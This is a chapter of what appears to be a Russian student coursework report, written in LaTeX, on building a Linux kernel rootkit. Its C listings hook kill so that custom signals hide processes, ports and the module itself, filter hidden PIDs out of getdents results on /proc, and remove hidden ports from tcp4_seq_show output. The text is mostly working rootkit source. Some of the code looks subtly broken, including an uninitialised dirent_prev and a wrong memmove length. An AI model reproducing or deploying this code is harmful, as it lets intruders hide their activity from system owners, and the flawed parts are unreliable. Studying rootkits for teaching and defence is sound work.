\chapter{Технологический раздел}%
\label{cha:tekhnologicheskii_razdel}


\section{Выбор языка программирования и среды разработки}%
\label{sec:vybor_iazyka_programmirovaniia_i_sredy_razrabotki}

В качестве языка программирования был выбран язык C, так как при помощи этого языка написано большинство загружаемых модулей ОС Linux.

В качестве текстового редактора был выбран текстовый редактор VsCode.


\section{Взаимодействие с пользователем}
Взаимодействие с пространством пользователя происходит при помощи
механизма сигналов.

В листинге 3.1 представлены объявления используемых в программе
констант и типов. Здесь резервируются три определённых для пользователя
сигнала, определяется структура linux\_dirent.

\begin{lstlisting}[label=lst:a1, caption=Объявление констант и типов, language=c]
    enum {
        SIGINVISPROC = SIGUSR1, // 10
        SIGINVISPORT = SIGUSR2, // 12
        SIGMODHIDE   = SIGRTMIN  // 32
    };
    struct linux_dirent {
        unsigned long	d_ino;
        unsigned long	d_off;
        unsigned short	d_reclen;
        char		d_name[1];
    };
\end{lstlisting}

Функция для перехвата kill определена в листинге 3.2. Перехват функции
kill требуется для обработки новых заданных сигналов.

\begin{lstlisting}[label=lst:a2, caption=Перехват функции kill, language=c]
KHOOK_EXT(long , __x64_sys_kill , const struct pt_regs *);
static long khook___x64_sys_kill(const struct pt_regs *pt_regs) {
    struct task_struct *task;
    pid_t pid = (pid_t) pt_regs->di;
    int sig = (int) pt_regs->si;

    switch (sig) {
    case SIGINVISPROC :
        if (( task = find_task_struct (pid)))
            toggle_proc_invisability (task);
        else
            return ESRCH;
        break;
    case SIGINVISPORT :
        toggle_port_invisability (pid);
        break;
    case SIGMODHIDE :
        toggle_module_invisability ();
        break;
    default:
        KHOOK_ORIGIN(__x64_sys_kill , pt_regs);
    }
    
    return 0;
}
\end{lstlisting}

\section{Сокрытие и отображение процессов}
В листинге 3.3 описываются функции сокрытия и отображения процессов.
Эти функции проверяют и устанавливают/сбрасывают разряд переменной
flags, определённый для индикации невидимости процесса.

\begin{lstlisting}[label=lst:a2, caption={Сокрытие процессов, файл реализации}, language=c]    
    struct task_struct *find_task_struct(pid_t pid) {
        struct task_struct *task = current;
    
        for_each_process(task)
            if (task->pid == pid)
                return task;
    
        return NULL;
    }
    
    int is_invisible_pid(pid_t pid) {
        if (!pid)
            return 0;
        return is_invisible_task_struct(find_task_struct(pid));
    }
    
    int is_invisible_task_struct(struct task_struct *task) {
        if (task)
            return task->flags & PF_INVISIBLE;
        return 0;
    }
    
    void toggle_proc_invisability(struct task_struct *task) {
        if (task)
            task->flags ^= PF_INVISIBLE;
    }
\end{lstlisting}

Функция для перехвата getdents приведена в листинге 3.4.

\begin{lstlisting}[label=lst:a3, caption={Перехват getdents}, language=c]    
KHOOK_EXT(long, __x64_sys_getdents, const struct pt_regs *);
static long khook___x64_sys_getdents(const struct pt_regs *pt_regs) {
    int fd; 
    long ret;
    long off = 0;

    struct inode *d_inode;
    struct linux_dirent *dirent, *kdirent, *dirent_var, *dirent_prev;

    fd = (int)pt_regs->di;
    dirent = (struct linux_dirent *)pt_regs->si;

    ret = KHOOK_ORIGIN(__x64_sys_getdents, pt_regs);
    if (ret <= 0)
        return ret;

    d_inode =
        current->files->fdt->fd[fd]->f_path.dentry->d_inode;
    if (d_inode->i_ino != PROC_ROOT_INO)
        return ret;

    kdirent = kzalloc(ret, GFP_KERNEL);
    if (!kdirent)
        return ret;

    if (copy_from_user(kdirent, dirent, ret)) {
        kfree(kdirent);
        return ret;
    }

    while (off < ret) {
        dirent_var = (void *)kdirent + off;

        if (is_invisible_pid(str_to_pid(dirent_var->d_name))) {
            if (!dirent_prev) { // <==> if (dirent_var == kdirent)
                memmove(
                    dirent_var, (void *)dirent_var + dirent_var->d_reclen, ret
                );
                ret -= dirent_var->d_reclen;
            }
            else {
                dirent_prev->d_reclen += dirent_var->d_reclen;
                off += dirent_var->d_reclen;
            }
        }
        else {
            dirent_prev = dirent_var;
            off += dirent_var->d_reclen;
        }
    }

    copy_to_user(dirent, kdirent, ret);
    kfree(kdirent);
    return ret;
}
\end{lstlisting}


\section{Сокрытие и отображение сокетов}

Сетевые сокеты скрываются по номеру порта. Определённые в листинге 3.5 функции управляют
содержимым списка в котором хранятся порты.
\\

\begin{lstlisting}[label=lst:a4, caption={Сокрытие сетевых сокетов}, language=c]
#include <linux/in.h>
#include <linux/in6.h>
    
struct hidden_port {
    unsigned int port;
    struct list_head list;
};
    
struct list_head hidden_port_list;

void net_port_hide(unsigned int port) {
    struct hidden_port *hp;

    hp = kmalloc(sizeof(*hp), GFP_KERNEL);
    if (!hp)
        return;

    hp->port = port;
    list_add(&hp->list, &hidden_port_list);
}

void net_port_show(unsigned int port) {
    struct hidden_port *hp;

    list_for_each_entry (hp, &hidden_port_list, list) {
        if (hp->port == port) {
            list_del(&hp->list);
            kfree(hp);
            return;
        }
    }
}

int is_port_hidden(unsigned int port) {
    struct hidden_port *hp;

    list_for_each_entry (hp, &hidden_port_list, list)
        if (hp->port == port)
            return 1;

    return 0;
}

void toggle_port_invisability(unsigned int port) {
    if (is_port_hidden(port))
        net_port_show(port);
    else
        net_port_hide(port);
}
\end{lstlisting}


Функция для перехвата tcp4\_seq\_show определена в листинге 3.6. Функции для перехвата остальных системных вызовов для отображения сокетов аналогичны.

\begin{lstlisting}[label=lst:a6, caption={Перехват tcp4\_seq\_show}, language=c]
KHOOK_EXT(int, tcp4_seq_show, struct seq_file *, void *);
static int khook_tcp4_seq_show(struct seq_file *seq, void *v) {
    int ret;
    char port[12];
    struct hidden_port *hp;

    ret = KHOOK_ORIGIN(tcp4_seq_show, seq, v);

    list_for_each_entry (hp, &hidden_port_list, list) {
        sprintf(port, ":%04X", hp->port);

        if (strnstr(
                    seq->buf + seq->count - PROC_NET_ROW_LEN,
                    port,
                    PROC_NET_ROW_LEN
                )) {
            seq->count -= PROC_NET_ROW_LEN;
            break;
        }
    }

    return ret;
}
\end{lstlisting}



В данном разделе был выбран язык программирования, а также рассмотрена реализация программного обеспечения